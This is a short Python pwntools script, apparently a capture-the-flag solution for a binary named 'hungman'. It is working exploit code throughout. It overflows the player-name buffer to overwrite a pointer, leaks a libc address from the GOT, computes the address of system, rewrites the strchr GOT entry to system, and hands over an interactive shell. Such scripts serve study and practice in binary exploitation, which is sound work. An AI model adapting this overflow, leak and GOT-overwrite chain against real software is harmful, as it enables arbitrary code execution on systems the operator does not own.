#import pwntools and start the ELF
from pwn import *
target = process("./hungman")

#Send the first name
name0 = "0"*100
target.sendline(name0)

#Win the game and change the name
print target.recvline()
target.sendline("qwertyuioplkjhgfdsazxcvbnm")
print target.recvuntil("High score! change name?")
target.sendline("y")

#Overwrite the pointer with the new name
name1 = "1"*112 + p64(0x0000006500000320) + p64(0x602038)
target.sendline(name1)

#Store the input of the elf trying to print the player's name and filter out the leaked address
leak = target.recvuntil("Continue?")
leak = leak.replace("Highest player: ", "")
leak = leak.replace(" score: 800", "")
leak = leak.replace("Continue?", "")
leak = leak.replace("\n", "")
leak = u64(leak + "\x00\x00")

#Calculate the address of system
sys_adr = leak - 288544

#Print the leak, and the system address
print "The leak is: " + hex(leak)
print "The address of system is: " + hex(sys_adr)

#Win the game again, and start the name change
target.sendline("y")
target.sendline("qwertyuioplkjhgfdsazxcvbnm")
target.sendline("y")
print target.recvline("High score! change name?")

#Change the name to rewrite the strchr got entry to system
target.send(p64(sys_adr))

#Hand the process off to the interactive shell
target.interactive()
